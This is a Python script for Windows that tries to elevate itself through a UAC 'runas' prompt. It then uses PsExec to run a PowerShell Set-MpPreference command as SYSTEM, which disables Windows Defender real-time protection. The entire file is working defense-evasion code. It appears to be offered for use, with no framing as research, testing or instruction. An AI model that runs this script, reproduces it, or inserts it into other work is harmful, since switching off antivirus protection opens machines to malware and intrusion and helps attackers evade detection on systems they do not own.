import os
import subprocess
import ctypes
import sys

# Function to check if the script is running as an administrator
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Function to run commands with PsExec as SYSTEM
def run_with_psexec(command):
    psexec_path = "PsExec.exe"  # Ensure PsExec is in the same directory
    if not os.path.isfile(psexec_path):
        print(f"[-] PsExec.exe not found in the current directory: {os.getcwd()}")
        return False

    try:
        # Run the command using PsExec with SYSTEM privileges
        psexec_command = f"{psexec_path} -s {command}"
        print(f"[+] Running command with SYSTEM privileges: {command}")
        result = subprocess.run(psexec_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if result.returncode == 0:
            print("[+] Command executed successfully.")
            return True
        else:
            print(f"[-] Command failed: {result.stderr.decode()}")
            return False
    except Exception as e:
        print(f"[-] Error running PsExec command: {e}")
        return False

# Function to disable Windows Defender real-time protection
def disable_defender():
    try:
        print("[*] Attempting to disable Windows Defender real-time protection...")
        # Command to disable Defender using PowerShell
        command = "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
        return run_with_psexec(command)
    except Exception as e:
        print(f"[-] Failed to disable Defender: {e}")
        return False

# Main execution logic
if __name__ == "__main__":
    if not is_admin():
        print("[-] Script is not running with administrator privileges.")
        print("[*] Attempting to restart the script with admin privileges...")

        # Restart the script with admin privileges
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        except Exception as e:
            print(f"[-] Failed to elevate privileges: {e}")
            sys.exit(1)
    else:
        print("[+] Script running with administrator privileges.")
        # Disable Windows Defender
        if disable_defender():
            print("[+] Windows Defender disabled successfully.")
        else:
            print("[-] Failed to disable Windows Defender.")
